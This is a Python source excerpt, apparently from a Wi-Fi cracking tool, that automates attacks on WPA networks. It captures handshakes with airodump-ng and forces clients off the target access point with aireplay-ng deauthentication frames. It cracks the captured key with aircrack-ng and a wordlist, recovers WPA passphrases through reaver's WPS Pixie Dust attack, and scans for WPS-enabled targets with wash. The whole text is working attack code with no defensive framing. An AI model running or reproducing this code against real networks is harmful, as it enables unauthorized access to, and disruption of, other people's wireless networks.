
def wpa_attack(bssid, channel, iface_mon):
	if os.path.exists(OS_PATH + '/cr0z0n0_attack-01.csv'):
		os.remove(OS_PATH + '/cr0z0n0_attack-01.csv')
		os.remove(OS_PATH + '/cr0z0n0_attack-01.cap')
		os.remove(OS_PATH + '/cr0z0n0_attack-01.kismet.csv')
		os.remove(OS_PATH + '/cr0z0n0_attack-01.kismet.netxml')

	cmd_airodump = pexpect.spawn(
			'airodump-ng --bssid {0} -c {1} -w cr0z0n0_attack {2}'.format(bssid, channel, iface_mon))
	time.sleep(5)

	cmd_aireplay = pexpect.spawn('aireplay-ng -0 10 -a {0} {1}'.format(bssid, iface_mon))
	time.sleep(10)
	cmd_aireplay.close()

	cmd_airodump.expect(['handshake:', pexpect.TIMEOUT, pexpect.EOF], WPA_EXPECT_HANDSHAKE_TIME)
	cmd_airodump.close()

	cmd_crack = pexpect.spawn('aircrack-ng -w dic cr0z0n0_attack-01.cap')
	cmd_crack.logfile = open(LOG_FILE, 'wb')
	cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF], WPA_AIRCRACK_TIME)
	cmd_crack.close()
	key_found = False
	parse_log_crack = open(LOG_FILE, 'r')
	for line in parse_log_crack:
		where = line.find('KEY FOUND!')
		if where > -1:
			key_end = line.find(']')
			key_found = line[where + 13:key_end]
	parse_log_crack.close()
	os.remove(LOG_FILE)

	return key_found


def wpa_with_wps_attack(bssid, channel, iface_mon):
	cmd_reaver = pexpect.spawn(
			'reaver -i {0} -c {1} -b {2} -s n -K 1 -vv'.format(iface_mon, channel, bssid))  # no ended
	cmd_reaver.logfile = open(LOG_FILE, 'wb')
	cmd_reaver.expect(['WPS pin not found!', pexpect.TIMEOUT, pexpect.EOF], 30)
	cmd_reaver.close()

	key_found = False
	parse_log_crack = open(LOG_FILE, 'r')
	for line in parse_log_crack:
		if line.find('WPA PSK: ') != -1:
			key_found = line[line.find("WPA PSK: '") + 10:-1]
	parse_log_crack.close()
	os.remove(LOG_FILE)

	return key_found


def wps_check(bssid, iface_mon):
	cmd_wps = pexpect.spawn('wash -i {0}'.format(iface_mon))
	cmd_wps.logfile = open(LOG_FILE, 'wb')
	cmd_wps.expect([bssid, pexpect.TIMEOUT, pexpect.EOF], 30)
	cmd_wps.close()

	wps = False
	parse_log_wps = open(LOG_FILE, 'r')
	for line in parse_log_wps:
		if line.find(bssid) != -1:
			wps = True
	parse_log_wps.close()
	os.remove(LOG_FILE)

	return wps
